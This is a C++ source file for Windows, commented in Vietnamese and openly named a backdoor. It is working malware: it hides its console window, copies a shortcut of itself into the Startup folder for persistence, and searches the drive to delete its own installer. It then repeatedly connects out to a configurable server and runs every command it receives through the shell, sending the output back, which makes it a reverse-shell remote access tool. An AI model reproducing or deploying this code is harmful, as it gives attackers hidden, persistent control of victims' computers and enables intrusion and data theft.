#include <iostream>
#include <WinSock2.h>
#include <thread>
#include <ws2tcpip.h>
#include <Windows.h>
#include <ShlObj.h>

#pragma comment(lib, "ws2_32.lib")

void AddToStartup() {
    // Lấy đường dẫn tới thư mục Startup của User
    wchar_t startupPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        // Tạo đường dẫn cho shortcut
        std::wstring shortcutPath = std::wstring(startupPath) + L"\\Windows Backdoor.lnk";

        // Lấy đường dẫn tới chương trình đang chạy
        wchar_t executablePath[MAX_PATH];
        GetModuleFileName(NULL, executablePath, MAX_PATH);

        // Tạo đối tượng ShellLink
        IShellLink* pShellLink = NULL;
        CoInitialize(NULL);
        if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&pShellLink))) {
            // Đặt đường dẫn tới chương trình
            pShellLink->SetPath(executablePath);

            // Lưu shortcut vào thư mục Startup
            IPersistFile* pPersistFile;
            if (SUCCEEDED(pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile))) {
                pPersistFile->Save(shortcutPath.c_str(), TRUE);
                pPersistFile->Release();
            }
            pShellLink->Release();
        }
        CoUninitialize();
    }
}

void DeleteFileRecursively(const wchar_t* directory, const wchar_t* filename) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((std::wstring(directory) + L"\\*").c_str(), &findFileData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(findFileData.cFileName, L".") != 0 && wcscmp(findFileData.cFileName, L"..") != 0) {
                std::wstring filePath = std::wstring(directory) + L"\\" + findFileData.cFileName;
                if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    // Nếu là thư mục, tiếp tục tìm kiếm bên trong thư mục đó
                    DeleteFileRecursively(filePath.c_str(), filename);
                }
                else {
                    // Nếu là tệp tin, kiểm tra xem có trùng với tên tệp tin cần xóa không
                    if (wcscmp(findFileData.cFileName, filename) == 0) {
                        DeleteFile(filePath.c_str());
                    }
                }
            }
        } while (FindNextFile(hFind, &findFileData) != 0);
        FindClose(hFind);
    }
}

int main() {
    // Lấy handle của cửa sổ console
    HWND consoleWindow = GetConsoleWindow();
    // Ẩn cửa sổ console
    ShowWindow(consoleWindow, SW_HIDE);

    AddToStartup();

    // Xóa tệp tin installer
    const wchar_t* filenameToDelete = L"BackdoorSetup.msi";

    // Tìm và xóa tệp tin trong toàn bộ hệ thống tập tin
    DeleteFileRecursively(L"C:", filenameToDelete);

    while (true) {
        // Khởi tạo Winsock
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "Khong the khoi tao Winsock" << std::endl;
            return -1;
        }

        // Tạo socket
        SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Khong the tao socket" << std::endl;
            WSACleanup();
            return -1;
        }

        // Thiết lập địa chỉ của server
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(4000); // Thay thế bằng port của server
        inet_pton(AF_INET, "127.0.0.1", &(serverAddr.sin_addr)); // Thay thế bằng địa chỉ IP của server

        // Kết nối đến server
        if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            std::cerr << "Khong the ket noi den server" << std::endl;

            // Đóng kết nối và giải phóng tài nguyên
            closesocket(clientSocket);
            WSACleanup();

            // Đợi 30 giây trước khi kết nối lại
            std::this_thread::sleep_for(std::chrono::seconds(30));
            continue; // Quay lại vòng lặp để thực hiện kết nối lại
        }

        std::cout << "Da ket noi den server" << std::endl;
        std::string response = "Client da ket noi. Hay nhap lenh\n";
        send(clientSocket, response.c_str(), response.length(), 0);

        // Nhận dữ liệu từ server
        char buffer[1024];
        int bytesRead;
        while ((bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0) {
            // Xử lý dữ liệu nhận được ở đây
            std::cout << "Nhan lenh tu server: " << std::string(buffer, bytesRead) << std::endl;

            // Thực hiện xử lý lệnh và gửi phản hồi về server
            std::string serverCommand(buffer, bytesRead);

            // Loại bỏ byte cuối cùng
            if (!serverCommand.empty()) {
                serverCommand.erase(serverCommand.size() - 1);
            }
            if (serverCommand == "exit") {
                exit(0);
                break;
            }
            else {
                // Thực hiện xử lý lệnh ở đây, ví dụ: thực thi lệnh và gửi kết quả về server
                // Lệnh cmd bạn muốn thực thi
                const char* command = serverCommand.c_str();

                // Mở một luồng đọc từ quá trình cmd
                FILE* cmdStream = _popen(command, "r");
                std::string result;
                if (cmdStream) {
                    // Đọc kết quả từ luồng
                    char buffer[128];
                    while (fgets(buffer, sizeof(buffer), cmdStream) != nullptr) {
                        result += buffer;
                    }
                    // Đóng luồng đọc
                    _pclose(cmdStream);
                }
                else {
                    std::cerr << "Khong the mo luong doc tu cmd." << std::endl;
                    return 1;
                }
                std::string commandOutput = "Ket qua xu ly lenh: \n" + result; // Thực hiện xử lý lệnh và lấy kết quả
                send(clientSocket, commandOutput.c_str(), commandOutput.length(), 0);
            }
        }
        // Đóng kết nối và giải phóng tài nguyên
        closesocket(clientSocket);
        WSACleanup();
    }
    return 0;
}